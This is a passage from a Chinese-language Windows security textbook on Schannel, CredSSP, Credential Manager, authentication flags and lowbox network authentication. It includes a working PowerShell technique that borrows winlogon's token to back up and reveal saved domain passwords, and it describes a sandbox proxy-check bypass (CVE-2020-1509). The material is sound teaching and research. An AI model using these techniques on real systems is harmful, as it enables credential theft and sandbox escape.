在代码清单 15-7中，我们生成一个X.509证书，并完成安全通道身份验证服务器端的设置。




```
PS> $store = "Cert:\CurrentUser\My"
❶ PS> $cert = Get-ChildItem $store | Where-Object Subject -Match $name
PS> if ($null -eq $cert) {
❷     $cert = New-SelfSignedCertificate -DnsName $name -CertStoreLocation $store
}
❸ PS> $server_cred = Get-LsaSchannelCredential -Certificate $cert
PS> $credin = New-LsaCredentialHandle -Package "Schannel" -UseFlag Inbound
-Credential $server_cred
PS> $server = New-LsaServerContext -CredHandle $credin
❹ PS> while(!(Test-LsaContext $client) -and !(Test-LsaContext $server)) {
    Update-LsaServerContext -Server $server -Client $client
    Update-LsaClientContext -Client $client -Server $server
}
```


*代码清单 15-7：初始化安全通道服务器上下文并完成身份验证*

我们首先检查是否有一个证书，其主题名称与创建客户端身份验证上下文时指定的DNS名称匹配❶。PowerShell通过*Cert*驱动器提供程序公开系统的证书存储。在本例中，我们仅检查当前用户的个人证书存储中是否有匹配的证书。

如果证书不存在，我们使用`New-SelfSignedCertificate`命令创建一个新证书，以DNS名称作为主题，并将其存储在当前用户的个人存储中❷。此证书不受TLS证书链信任。你可以将新证书添加到`Cert:\CurrentUser\Root`，这将使其受信任；然而，在本例中，更安全的做法是仅在客户端禁用证书检查。

要使用该证书作为服务器，我们需要创建一组安全通道凭据，指定供服务器使用的证书❸。请注意，证书必须具有关联的私钥供服务器使用。如果你选择的证书没有私钥，这行代码将生成错误。我们可以使用这些凭据创建句柄，并从中创建服务器身份验证上下文。

最后，我们在服务器和客户端认证上下文之间交换令牌，直到认证完成❹。当然，在实际应用中，这个过程会通过网络连接交换令牌，但为了简化起见，我们在这里完全忽略网络。

在开始其他操作之前，我们可以检查协商的安全信息，如代码清单 15-8所示。




```
PS> $client.ConnectionInfo
Protocol      Cipher  Hash    Exchange
--------      ------  ----    --------
TLS1_2_CLIENT AES_256 SHA_384 ECDH_EPHEM

PS> $client.RemoteCertificate
Thumbprint                                Subject
----------                                -------
2AB144A50D93FE86BA45C4A1F17046459D175176  CN=NotReallyReal.com

PS> $server.ConnectionInfo
Protocol      Cipher  Hash    Exchange
--------      ------  ----    --------
TLS1_2_SERVER AES_256 SHA_384 ECDH_EPHEM
```


*代码清单 15-8：检查连接信息*

请注意，`ConnectionInfo`属性返回协商的协议和加密算法。在本例中，我们协商了使用AES256加密算法的TLS 1.2，SHA384用于完整性校验，以及椭圆曲线Diffie-Hellman用于交换临时加密密钥。

我们还可以查询服务器的证书。这应该与我们在服务器凭据中使用的证书匹配。由于我们指定了手动凭据验证，我们可以检查证书是否有效；如果我们没有请求手动验证，握手过程将会生成错误。最后，我们还可以查询服务器的连接信息，以双重确认它与客户端的连接信息相同。

此时，我们已经建立了连接，但尚未向服务器传输任何用户数据字节。代码清单 15-9展示了如何加密和解密通过网络连接发送的应用程序数据。




```
❶ PS> $header = New-LsaSecurityBuffer -Type StreamHeader
-Size $client.StreamHeaderSize
PS> $data = New-LsaSecurityBuffer -Type Data -Byte 0, 1, 2, 3
PS> $trailer = New-LsaSecurityBuffer -Type StreamTrailer
-Size $client.StreamTrailerSize
PS> $empty = New-LsaSecurityBuffer -Empty
PS> $bufs = $header, $data, $trailer, $empty
❷ PS> Protect-LsaContextMessage -Context $client -Buffer $bufs -NoSignature
❸ PS> $msg = $header, $data, $trailer | ConvertFrom-LsaSecurityBuffer
PS> $msg_token = Get-LsaAuthToken -Context $client -Token $msg
PS> Format-LsaAuthToken $msg_token
SChannel Record 0
❹ Type    : ApplicationData
Version : 3.3
Data    :
          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF
-----------------------------------------------------------------------------
00000000: 00 00 00 00 00 00 00 01 C7 3F 1B B9 3A 5E 40 7E  - .........?..:^@~
00000010: B0 6C 39 6F EC DA E7 CC CC 33 C2 95              - .l9o.....3..

❺ PS> $header = New-LsaSecurityBuffer -Type Data -Byte $msg
PS> $data = New-LsaSecurityBuffer -Empty
PS> $trailer = New-LsaSecurityBuffer -Empty
PS> $empty = New-LsaSecurityBuffer -Empty
PS> $bufs = $header, $data, $trailer, $empty
❻ PS> Unprotect-LsaContextMessage -Context $server -Buffer $bufs -NoSignature
PS> ConvertFrom-LsaSecurityBuffer $data | Out-HexDump
00 01 02 03
```


*代码清单 15-9：加密和解密应用程序数据*

安全通道要求将四个缓冲区传递给`Protect-LsaContextMessage`命令❶。第一个缓冲区用于TLS记录头。它需要是`StreamHeader`类型，并且大小应通过上下文的`StreamHeaderSize`属性查询。

第二个缓冲区用于要加密的数据，必须是`Data`类型。该缓冲区有最大允许大小，您可以使用`StreamMaxMessageSize`属性查询。最大大小通常为16KB，因此我们这里使用的4字节应远在限制之内。如果要加密的应用程序数据大于最大大小，您需要将数据分割成更小的部分。

第三个缓冲区将包含流尾部，必须是`StreamTrailer`类型，大小为`StreamTrailerSize`。最后一个缓冲区是空的。安全通道包似乎不使用该缓冲区存储任何内容，但您必须传递它，否则调用将失败。

现在，我们可以通过将所有四个缓冲区传递给`Protect-LsaContextMessage`命令来加密数据❷。需要注意的重要一点是，您还应该传递`NoSignature`参数。任何生成的签名都将是生成的协议数据的一部分，不会单独返回，因此命令无需自动处理签名。

加密的结果是，头、数据和尾部缓冲区被填充了传输应用程序数据到服务器所需的数据。我们需要使用`ConvertFrom-LsaSecurityBuffer`命令将缓冲区连接在一起❸。在这种情况下，我们已经知道生成的数据是TLS记录，因此可以使用认证上下文命令来检查其结构。我们可以看到记录类型现在是`ApplicationData`❹，而在代码清单 15-6中记录类型是`Handshake`。使用`ApplicationData`表示这是一个加密的数据记录。

现在我们需要在服务器上解密数据。为此，我们再次需要四个缓冲区；然而，它们的配置略有不同。对于解密，我们必须将整个TLS记录放在第一个缓冲区中，类型为`Data`❺。接下来的三个缓冲区可以为空；它们将在解密过程中被填充为消息的相应部分。

我们将缓冲区传递给`Unprotect-LsaContextMessage`命令，再次指定`NoSignature`参数，因为签名是协议的一部分❻。检查原本为空的数据缓冲区时，我们现在发现它已被填充为原始的未加密数据。

我让安全通道看起来易于使用，但它比这里展示的要复杂得多。例如，您需要处理带外警报，这些警报指示连接问题。我建议您使用现有的类（例如.NET自带的`SslStream`）来为您的应用程序添加TLS支持，除非您需要使用的功能未被公开暴露。

默认情况下，TLS协议在安全通道连接中仅验证服务器，使用X.509证书；然而，服务器可以请求客户端也提供有效证书以供验证。若要要求客户端发送证书，请在创建服务器认证上下文时指定`MutualAuth`请求属性。默认情况下，安全通道会尝试在客户端上为用户查找合适的证书，但您可以通过在生成客户端凭据时设置显式证书来覆盖此搜索。

服务器可以使用服务器认证上下文上的相同`RemoteCertificate`属性查询客户端证书。请注意，安全通道默认不验证客户端证书的内容；这由服务器应用程序负责。安全通道唯一保证的是客户端能够证明其拥有与证书对应的私钥。如果服务器属于企业网络，可以将身份证书添加到Active Directory中，以便客户端证书可以映射到用户账户，并且无需进一步认证即可查询`Token`对象以获取用户身份。

#### CredSSP

我们将查看的最后一个安全包是*CredSSP*，这是由微软开发的一种认证协议，旨在提高Windows机器远程桌面连接的安全性。图15-2展示了原始的远程桌面实现。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure15-2.webp)

图15-2：原始的远程桌面实现

在原始实现中，客户端使用客户端应用程序❶连接到服务器。RDP服务器随后会为用户创建一个LogonUI，显示正常的Windows登录用户界面，并通过RDP复制此LogonUI，使用户在其客户端机器上看到相同的界面。用户随后可以在LogonUI中输入用户名和密码❷，这将遵循第12章中概述的交互式认证过程来验证用户的凭据❸并创建其桌面。

这种实现远程桌面的方法存在几个安全问题。首先，它不对客户端进行验证；这允许任何人连接，然后尝试猜测用户密码或利用LogonUI中的某些漏洞来获取服务器访问权限。其次，为用户界面启动桌面会话是一项相当昂贵的操作；很容易通过向远程桌面服务器发起足够多的连接来耗尽机器资源并导致拒绝服务条件。最后，用户存在凭据被钓鱼的风险，因为他们可能被诱骗连接到恶意远程服务器并提供凭据。

微软对这些问题的解决方案是*网络级身份验证（NLA）*。NLA从Windows Vista开始可用，并且是启用远程桌面连接时使用的默认认证机制。NLA通过将认证集成到远程桌面协议中，并在启动桌面会话之前验证用户具有有效凭据，从而避免了上述问题。这确认了客户端的身份，防止了在认证成功之前进行昂贵的桌面设置操作，并允许用户避免向服务器披露其凭据。

CredSSP包实现了NLA。它提供TLS用于网络级加密（基于安全通道），以及一个单独的*TS服务安全包（TSSSP）*，该包使用Negotiate协议对用户进行认证，并派生会话密钥以在将用户凭据发送到服务器时进行加密。图15-3展示了使用NLA连接到远程桌面服务器的概述。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure15-3.webp)

图15-3：使用网络级身份验证的远程桌面连接

首先，用户不是立即建立连接，而是向远程桌面客户端提供其凭据❶。这通常包括他们用于远程服务器的用户名和密码。

客户端随后使用CredSSP包与远程服务器建立连接，并通过TLS保护网络流量❷。服务器设置相应的CredSSP认证上下文以实现此通信。接下来，其CredSSP上下文利用TSSSP包，基于现有的网络认证协议（如NTLM或Kerberos）来验证客户端❸。如果此验证步骤失败，服务器可在创建昂贵的桌面环境之前关闭连接。

您可能会认为，一旦网络认证完成，服务器就会立即创建用户的桌面，但在连接远程桌面时，还存在一个额外的复杂因素。通常，当您使用NTLM或Kerberos等网络认证协议时，服务器上创建的登录会话只能访问本地资源，因为用户的凭据仅存储在客户端计算机上。这就是我在第13章中讨论NTLM域网络认证时提到的“双跳问题”。

如果远程桌面用户仅访问服务器上的本地资源，这种行为是可行的。但使用远程桌面时，用户通常期望能够对网络上的其他机器执行单点登录，以便从该远程桌面会话中继续工作。为解决单点登录问题，客户端的CredSSP上下文将用户的凭据委托给服务器❹。它使用网络认证中协商的会话密钥对这些凭据进行加密。

由于认证的会话密钥源自密码，恶意服务器无法利用NTLM中继或转发Kerberos票据来捕获凭据，因为它们无法解密这些凭据。一旦LSA获得凭据副本，远程用户便可以使用它们连接到其他网络服务，就像他们已交互式认证一样。

虽然CredSSP是为远程桌面连接而设计的，但您也会发现它用于其他需要凭据委托的场景。例如，在PowerShell中，可以通过WinRM协议使用CredSSP，该协议用于PowerShell远程处理。这允许您创建具有客户端凭据的远程PowerShell会话，并连接到网络上的其他系统。

我不会提供使用CredSSP的示例，因为它在大多数情况下看起来与测试安全通道时看到的TLS连接相似。相反，让我们涵盖一些我尚未提及的最终认证主题。

### 远程凭据保护与受限管理模式

您可能会注意到，在将凭据委派给远程桌面服务器时存在一个问题。借助NLA，您可以确信服务器能够验证您的凭据，但如果攻击者已入侵服务器，他们可能在身份验证过程中凭据被解密后窃取这些凭据。或许有攻击者正等待您使用特权域管理员凭据连接到服务器。此外，即使您已注销系统，服务器仍有可能将您的凭据遗留在LSASS进程的内存中，这意味着恶意攻击者稍后可以获取它们。

Windows提供了两个可选功能来降低服务器被入侵的风险。第一个是*远程凭据保护*，它与Kerberos身份验证配合使用，避免直接委派用户的凭据。通过远程凭据保护，客户端可以按需生成新的Kerberos票据来访问资源。这使得客户端能够从远程桌面连接到其他系统，就像已委派其凭据一样。

对安全性而言，重要的是，这个创建新票据的通道仅在客户端连接到服务器期间存在。如果客户端断开连接，服务器便无法再创建新票据，尽管已经通过身份验证的客户端很可能保持该状态。这意味着，只有在特权用户通过身份验证期间，机器被主动入侵才具有利用价值。

您需要在域中执行一些设置步骤才能启用远程凭据保护。本节不涉及这些设置步骤，但如果该功能已启用，您可以通过运行以下命令行，在远程桌面客户端中使用它：

```
PS> mstsc.exe /remoteGuard
```

第二个安全功能是*受限管理模式*。它与远程凭据保护的最大区别在于，当用户向服务器进行身份验证时，它会创建登录会话，但不包含用户的网络凭据。相反，该会话被分配了服务器上计算机账户的网络凭据。因此，该登录会话主要仅在用户希望本地执行任务时有用；除非用户明确向远程服务器提供其凭据，否则他们无法以自身身份连接到网络资源。然而，此功能确保如果服务器被入侵，没有特权凭据可被窃取。

要启用受限管理模式，首先在*HKLM\System\CurrentControlSet\Control\Lsa*中添加一个名为DisableRestrictedAdmin的DWORD注册表键值，并将其设置为0。然后，您可以在执行客户端时通过以下命令行启用该模式：

```
PS> Mstsc.exe /RestrictedAdmin
```

这两个安全功能的一个优势（除了它们对凭据委派施加的限制之外）是，它们允许远程桌面客户端基于LSA登录会话中存储的当前用户凭据使用单点登录身份验证。这是因为这两个功能都不需要明文凭据。

### 凭据管理器

使用远程桌面连接时，一个令人烦恼的问题是每次连接都需要输入密码。这似乎不可避免，因为必须向服务器提供账户密码，以便从远程桌面服务器实现单点登录。然而，LSA支持一项功能，可以保存账户密码以供后续认证使用，免去重复输入的麻烦。此功能的一个应用场景是，当你输入凭据时，对话框中会出现“记住我”复选框，如图15-4所示。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure15-4.webp)

图15-4：输入并保存您的凭据

如果勾选该复选框并成功认证，下次打开对话框时，输入服务器名称的界面会略有变化（图15-5）。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure15-5.webp)

图15-5：带有已保存凭据的连接对话框

现在可以看到，对话框提供了编辑或删除该服务器已保存凭据的选项。

客户端直接将用户密码存储到磁盘文件虽然简单，但不够安全。因此，它使用了LSA提供的一项服务，即*凭据管理器*。该服务可以存储域密码以便重复使用，尽管微软并不推荐这种做法。为了演示凭据是如何存储的，代码清单 15-10首先使用Get-Win32Credential PowerShell命令（该命令调用CredRead Win32 API）来读取远程桌面客户端的凭据。

```
PS> Get-Win32Credential "TERMSRV/primarydc.domain.local" DomainPassword |
Format-Table UserName, Password
UserName                 Password
--------                 --------
MINERAL\Administrator
```

*代码清单 15-10：获取远程桌面客户端的凭据*

凭据按目标名称存储，对于域凭据，目标名称是服务的SPN（本例中为TERMSRV/primarydc.domain.local）。查找凭据时，还需要指定类型，本例中为DomainPassword。

这里，我们格式化输出以仅显示用户名和密码。但您可能会注意到一个问题：密码列为空。这是服务的有意行为。如果凭据代表域密码，则除非调用者在LSA进程内运行，否则不会返回密码。

这种行为对其预期用途是合适的：用于在LSA内部运行的安全包。例如，CredSSP可以根据SPN检查用户是否有针对目标远程桌面服务的凭据，并使用它读取用户密码以自动认证。该服务将凭据存储在用户配置文件中的各个文件中，如代码清单 15-11所示。

```
PS> ls "$env:LOCALAPPDATA\Microsoft\Credentials" -Hidden
    Directory: C:\Users\alice\AppData\Local\Microsoft\Credentials
Mode    LastWriteTime         Length Name
----    -------------         ------ ----
-a-hs-  5/17      10:15 PM    4076   806C9533269FB8C19A759596441A2ECF
-a-hs-  5/17       9:49 PM    420    B5E4F2A09B2613B8305BA6A43DC15D1F
-a-hs-  5/6        6:33 PM    11396  DFBE70A7E5CC19A398EBF1B96859CE5D
-a-hs-  5/17       3:56 PM    1124   E05DBE15D38053457F3523A375594044
```

*代码清单 15-11：查看用户的凭据文件*

每个文件都通过数据保护API（DPAPI）使用每用户密钥加密，这我在第10章中提到过。这意味着我们应该能够使用DPAPI通过.NET的ProtectedData类解密自己的凭据文件。代码清单 15-12枚举当前用户的凭据文件，并尝试使用ProtectedData解密每个文件。

```
PS> Add-Type -AssemblyName "System.Security"
PS> ls "$env:LOCALAPPDATA\Microsoft\Credentials" -h | ForEach-Object {
    $ba = Get-Content -Path $_.FullName -Encoding Byte
    [Security.Cryptography.ProtectedData]::Unprotect($ba,$null,"CurrentUser")
}
Exception calling "Unprotect" with "3" argument(s): "The data is invalid."
--snip--
```

*代码清单 15-12：尝试解密用户的凭据文件*

不幸的是，每个文件都返回相同的错误：数据无效。虽然文件是使用用户的DPAPI密钥加密的，但LSA在二进制数据中设置了一个特殊标志，指示只有LSA中运行的代码才能解密。

有多种方法可以成功解密这些文件：例如，您可以将代码注入LSA进程并从那里解密，或者使用用户密码和SECURITY数据库注册表键中的值派生DPAPI密钥，然后自行解密。如果您想走后者路线，我建议查看现有工具，如Mimikatz，它已经实现了此功能。

Windows Vista 引入了解密文件的另一种方法。一个特殊的令牌特权，`SeTrustedCredmanAccessPrivilege`，允许进程在访问特定凭据管理器 API 时被 LSA 视为受信任的。这些特定 API 中最有趣的是 `CredBackupCredentials`，它可以将用户的所有凭据备份到一个文件中，该文件日后可用于恢复凭据（如有需要）。备份还包含任何受保护的密码值。

代码清单 15-13 展示了如何从凭据管理器备份用户的凭据。您必须以管理员身份运行这些命令，因为您需要访问特权进程以获取带有 `SeTrustedCredmanAccessPrivilege` 的令牌，该特权仅授予特定类型的进程。




```
PS> Enable-NtTokenPrivilege SeDebugPrivilege
❶ PS> $token = Use-NtObject($ps = Get-NtProcess -Name "winlogon.exe"
-Access QueryLimitedInformation) {
    $p = $ps | Select-Object -First 1
    Get-NtToken -Process $p -Duplicate
}
❷ PS> $user_token = Get-NtToken
PS> $ba = Invoke-NtToken -Token $token {
  ❸ Enable-NtTokenPrivilege SeTrustedCredmanAccessPrivilege
    Backup-Win32Credential -Token $user_token
}
❹ PS> Select-BinaryString -Byte $ba -Type Unicode |
Select-String "^Domain:" -Context 0, 2
> Domain:target=TERMSRV/primarydc.mineral.local
  MINERAL\Administrator
  Passw0rd10
```


*代码清单 15-13：从凭据管理器备份用户的凭据*

我们首先打开特权的 Winlogon 进程，并复制其主令牌 ❶。接下来，我们获取要备份的用户令牌的副本，在本例中为当前进程令牌 ❷。然后，我们可以模拟从 Winlogon 复制的令牌 ❸，启用 `SeTrustedCredmanAccessPrivilege`，并调用 `Backup-Win32Credential` PowerShell 命令，该命令调用底层的 `CredBackupCredentials` API。

该命令返回包含备份的字节数组。该字节数组采用专有格式，因此我们选择其所有 Unicode 字符串，并查找以字符串 `Domain:` 开头的字符串 ❹。我们可以看到存储的远程桌面服务凭据，包括名称和密码。

凭据管理器是存储供 LSA 安全包（如 NTLM、Kerberos 和 CredSSP）使用的凭据的更好位置，而不是用户可访问的文件。然而，这并不意味着您应该使用它。虽然披露凭据需要一些工作，但像任何保护机制一样，它必须在某个时刻提供未加密的值，攻击者随后可以提取这些值。

### 附加请求属性标志

在创建客户端或服务器身份验证上下文时，您可以指定一组请求属性标志来改变身份验证的行为。在前面的章节中，我们已经看到了对签名和密封、以及委派和相互身份验证的支持。尽管如此，还是值得强调一下Kerberos和NTLM支持的其他几个标志。

#### 匿名会话

如果您不知道目标服务器上的用户账户怎么办？SSPI支持*匿名会话*的概念，也称为*NULL会话*。在匿名会话中，进行身份验证的用户不需要任何凭据来生成身份验证令牌。服务器将照常处理身份验证，但会为*ANONYMOUS LOGON*用户生成一个令牌。这允许网络协议始终要求身份验证，简化协议，然后基于已认证用户的身份来强制访问控制。您可以在创建客户端身份验证上下文时，通过使用NullSession请求属性标志来指定匿名会话，如代码清单 15-14所示。




```
PS> $client = New-LsaClientContext -CredHandle $credout
-RequestAttribute NullSession
```


*代码清单 15-14：添加NullSession请求属性标志*

如果您随后执行本地NTLM网络身份验证，应该会注意到NTLM AUTHENTICATE令牌中的变化，如代码清单 15-15所示。




```
<NTLM AUTHENTICATE>
❶ Flags      : Unicode, RequestTarget, NTLM, Anonymous,...
Workstation: GRAPHITE
❷ LM Response: 00
NT Response:
Version    : 10.0.18362.15
MIC        : 3780F9F6EC815DD34BA8A643162DC5FC

PS> Format-NtToken -Token $token
❸ NT AUTHORITY\ANONYMOUS LOGON
```


*代码清单 15-15：匿名会话中的NTLM AUTHENTICATE令牌*

NTLM AUTHENTICATE令牌设置了Anonymous标志❶。此外，LM响应是单个零字节，NT响应缺失❷。查询进程的Token对象显示它是匿名用户的❸。

在Kerberos中，匿名身份验证令牌看起来与NTLM的类似，如代码清单 15-16所示。




```
<KerberosV5 KRB_AP_REQ>
Options         : None
<Ticket>
Ticket Version  : 0
ServerName      : UNKNOWN -
Realm           :
Encryption Type : NULL
Key Version     : 0
Cipher Text     :
00000000: 00
<Authenticator>
Encryption Type : NULL
Key Version     : 0
Cipher Text     :
00000000: 00
```


*代码清单 15-16：发送匿名Kerberos AP-REQ消息*

客户端发送一个AP-REQ消息，其中包含的票据和认证器值均为空。如果您在网络捕获中看到此消息，可以确定客户端正在建立匿名会话。

#### 身份令牌

当您执行网络身份验证时，最终的Token对象是一个模拟级别的令牌。如果服务器能够通过第4章中描述的模拟检查，它现在就可以访问该用户的资源。如果我们不希望服务器能够使用我们的身份来访问资源怎么办？在这种情况下，我们可以指定Identify请求属性标志，如代码清单 15-17所示，以允许服务器仅接收一个标识级别的模拟令牌，而不是完整的模拟级别令牌。




```
PS> $client = New-LsaClientContext -CredHandle $credout -RequestAttribute Identify
```


*代码清单 15-17：添加Identify请求属性标志*

这将阻止服务器使用我们的身份来访问资源，但仍允许它检查谁已通过身份验证。如果我们随后重新运行身份验证，应该会注意到NTLM AUTHENTICATE令牌中的变化，如代码清单 15-18所示。




```
<NTLM AUTHENTICATE>
❶ Flags      : Unicode, RequestTarget, NTLM, Identity,...
--snip--

PS> Format-NtToken -Token $token -Information
TOKEN INFORMATION
-----------------
Type       : Impersonation
❷ Imp Level  : Identification
```


*代码清单 15-18：检查NTLM AUTHENTICATE令牌中的标志并显示所创建令牌的模拟级别*

NTLM AUTHENTICATE令牌的标志现在包含一个Identity标志❶。这向服务器表明客户端希望仅允许使用标识级别的令牌。当我们从服务器身份验证上下文获取令牌并格式化它时，可以看到模拟级别确实设置为标识❷。

与NullSession一样，Identify请求属性标志也适用于Kerberos。代码清单 15-19显示，指定此标志会导致在AP-REQ认证器的GSSAPI校验和字段中设置Identity标志。




```
<Authenticator>
--snip--
Checksum        : GSSAPI
Channel Binding : 00000000000000000000000000000000
Context Flags   : Identity
```


*代码清单 15-19：AP-REQ GSSAPI校验和中的Identity标志*

### 使用低盒令牌进行网络认证

当进程使用低盒令牌（如第4章所述）运行时，LSA会对网络认证的使用施加限制。这是为了增加沙盒应用滥用网络认证以获取用户登录会话凭据，进而访问其资源的难度。

然而，如果低盒进程能够创建客户端认证上下文，则仅在以下三种场景下可以生成认证令牌：

- 使用具有企业认证能力的登录会话凭据
- 使用登录会话凭据向已知的Web代理进行认证
- 使用显式凭据，例如用户名和密码

下面我们逐一讨论这些场景。

#### 使用企业认证能力进行认证

*企业认证能力*，由SID S-1-15-3-8表示，可以在创建低盒令牌时授予。具备此能力后，低盒进程可以使用用户的登录会话凭据生成任何受支持的网络认证令牌，如NTLM或Kerberos，且不受限制。

企业认证能力旨在供企业在其内部应用程序中使用。在企业之外，低盒进程的主要部署方式是通过Microsoft应用商店，而该商店在应用程序提交指南中限制了此能力的使用。如果您向Microsoft商店提交使用企业认证能力的应用程序，则必须通过额外审查，并可能被拒绝。但是，如果您出于测试目的在商店应用之外创建低盒令牌，则没有限制，如代码清单 15-20所示。

```
PS> $cred = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound
PS> $sid = Get-NtSid -PackageName "network_auth_test"
❶ PS> Use-NtObject($token = Get-NtToken -LowBox -PackageSid $sid) {
    Invoke-NtToken $token {New-LsaClientContext -CredHandle $cred}
}
❷ Exception calling ".ctor" with "5" argument(s): "(0x80090304) - The Local
Security Authority cannot be contacted"

PS> $cap = Get-NtSid -KnownSid CapabilityEnterpriseAuthentication
❸ PS> Use-NtObject($token = Get-NtToken -LowBox -PackageSid $sid
-CapabilitySid $cap) {
  ❹ $auth = Invoke-NtToken $token {New-LsaClientContext -CredHandle $cred}
    Format-LsaAuthToken $auth
}
<SPNEGO Init>
Mechanism List    :
1.3.6.1.4.1.311.2.2.10         - NTLM
1.2.840.48018.1.2.2            - Microsoft Kerberos
--snip--
```

*代码清单 15-20：测试低盒企业认证能力*

我们首先创建一个不带该能力的低盒令牌对象❶。当我们使用`New-LsaClientContext`创建客户端认证上下文时，会收到错误❷。此错误来自`InitializeSecurityContext` API，PowerShell在后台调用该API。接下来，我们创建带有该能力的低盒令牌❸。这次，我们可以成功创建客户端认证上下文并格式化客户端认证令牌❹。

#### 向已知的Web代理进行认证

低盒进程可以生成用于Web代理认证的令牌，Web代理通常要求域用户能够访问互联网。为支持此用例，如果目标名称设置为已批准代理服务器的地址，则可以使用用户的登录会话凭据执行网络认证。

例如，假设目标名称为`HTTP/proxy.mineral.local`。系统管理员必须通过组策略或使用*代理自动配置（PAC）*脚本配置代理地址，以确保具有任意代理配置的Web请求不会通过LSA的检查。代码清单 15-21演示了使用Web代理目标名称来允许网络认证。您必须已配置系统Web代理，此脚本才能正常工作。

```
PS> $cred = New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
❶ PS> $client = New-Object System.Net.WebClient
PS> $proxy = $client.Proxy.GetProxy("http://www.microsoft.com").Authority
❷ PS> $target = "HTTP/$proxy"
PS> $target | Write-Output
HTTP/192.168.0.10:1234

PS> $sid = Get-NtSid -PackageName "network_auth_test"
❸ PS> Use-NtObject($token = Get-NtToken -LowBox -PackageSid $sid) {
  ❹ $client = Invoke-NtToken $token {
        New-LsaClientContext -CredHandle $cred -Target $target
    }
    Format-LsaAuthToken $client
}
<NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, NTLM, AlwaysSign,...
```

*代码清单 15-21：测试低盒Web代理认证*

首先，我们使用`WebClient` .NET类查询代理设置❶。然后，我们使用HTTP服务类和代理地址构建目标SPN❷。

接下来，我们创建低盒令牌❸。请注意，我们未指定企业认证能力。我们创建客户端认证上下文并使用目标SPN❹。初始认证成功，我们可以向目标代理执行客户端认证。

此代理认证被认为是安全的，因为服务应在允许认证之前检查目标名称。如果低盒进程为代理SPN生成认证，但随后将其发送到SMB服务器，则认证过程应失败。对于Kerberos认证，SPN选择用于票据的密钥，因此如果发送到错误的服务，不正确的SPN应使票据无法解密。

#### 使用显式凭据进行认证

最后一个选项，如代码清单 15-22所示，是在创建提供给客户端认证上下文的凭据句柄时指定显式凭据。

```
PS> $cred = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound
-ReadCredential
UserName: user
Domain: GRAPHITE
Password: ********

PS> $sid = Get-NtSid -PackageName "network_auth_test"
PS> Use-NtObject($token = Get-NtToken -LowBox -PackageSid $sid) {
    Invoke-NtToken $token {
    ❶ $c = New-LsaClientContext -CredHandle $cred -Target "CIFS/localhost"
      Format-LsaAuthToken $c
    }
}
<NTLM NEGOTIATE>
Flags: Unicode, Oem, RequestTarget, NTLM, AlwaysSign,...
```

*代码清单 15-22：使用显式凭据初始化客户端认证上下文*

要初始化客户端身份验证上下文，你仍需提供目标SPN❶。不过，无需指定已知代理，因为目标可以是任何服务或主机。在此例中，我们指定CIFS/localhost SPN。

在低盒令牌沙箱中，你可以充当网络身份验证的服务器，因为有可能为不同用户获取令牌对象。然而，除非令牌的用户与调用者的用户及低盒包SID完全匹配，否则返回的令牌被设置为标识级别，这防止了其被滥用以提升权限。模拟级别的限制甚至适用于低盒令牌具有企业身份验证能力的情况，因为这仅授予对客户端身份验证上下文的访问权限。

绕过代理检查

微软对代理身份验证能力要求的这些绕过方式记录得非常不充分。对于几乎没有官方文档的安全功能，问题在于很少有开发者知道它们的存在，因此它们没有得到应有的严格测试，尤其是在异常边缘情况下。在理想世界中，微软会为代理检查功能实施全面的安全测试，但遗憾的是，我们并不生活在这样的世界中。

在为本书研究代理检查时，我逆向工程了其在LSA中的实现，并注意到如果目标名称不是代理，身份验证过程会继续，但LSA会为安全包设置一个标志，指示其必须使用显式提供的凭据。正如我们在第13章中介绍NTLM时所看到的，可以为当前用户提供用户名和域，但将密码留空；在这种情况下，安全包将使用登录凭据中的密码。

如果仅指定用户名和域，NTLM安全包会将其视为显式凭据，满足LSA设置的标志，即使身份验证将使用默认凭据。这绕过了所有检查，并授予低盒进程访问默认用户的权限，攻击者可能滥用此权限来访问该用户可访问的网络资源。你可以在CVE-2020-1509中了解更多关于此问题的信息。

即使在微软实施修复后，我仍能绕过检查，因为在研究期间我还注意到目标名称的检查未正确实现。回顾第13章，目标名称是由三个部分组成的SPN，用正斜杠分隔：服务类、实例名称和服务名称。LSA中的解析和检查代码存在两个问题：

- 它未验证服务类是否为HTTP或HTTPS。
- 它检查的是服务名称是否为代理地址，而非实例名称。

未验证服务类允许目标名称引用其他服务，如CIFS，用于向SMB服务器进行身份验证。这使我能够构造形如CIFS/fileserver.domain.com/proxy.domain.com的目标名称。如果proxy.domain.com是注册代理，此目标名称将通过代理检查；然而，SMB服务器只关心服务类和实例名称（此处为fileserver.domain.com），并再次允许访问用户的默认凭据。微软也修复了此问题，尽管未分配CVE编号。

服务名称问题的主要根本原因是微软用于解析SPN的API在未提供服务名称时，会将服务名称组件设置为与实例名称组件匹配。例如，HTTP/proxy.domain.com会将实例名称和服务名称都设置为proxy.domain.com。因此，此代码在微软有限的测试中有效，但当有人决定测试该功能的边缘情况时便失效了。在报告原始问题时，我向微软提到了目标名称解析绕过，但出于某种原因，它未同时修复。除了支持我之前关于未记录功能往往未得到充分测试的陈述外，此示例还说明了为什么应始终验证开发者所做的任何更改，以确保他们实施了全面的修复。

话虽如此，微软建议在不需要时，通过将AllowUnprivilegedProxyAuth注册表键值添加到HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa并将其值设置为0，来禁用对HTTP代理服务器的自动身份验证。如果该值不存在，Windows在目标为代理时默认启用此身份验证。

### 认证审计事件日志

让我们通过概述交互式和网络认证过程中生成的审计数据来结束对认证的讨论。在监控企业网络时，您可能希望了解哪些用户尝试过对Windows系统进行认证。通过分析审计日志，您可以识别他们对某台机器的成功和失败认证尝试。

您可以在我们讨论对象审计事件时检查过的同一安全事件日志中找到认证审计日志记录，参见第9章。我们可以使用类似的技术，通过事件ID过滤日志来获取我们感兴趣的事件。以下是一些重要认证事件的事件ID：

4624  账户成功登录。

4625  账户登录失败。

4634  账户注销。

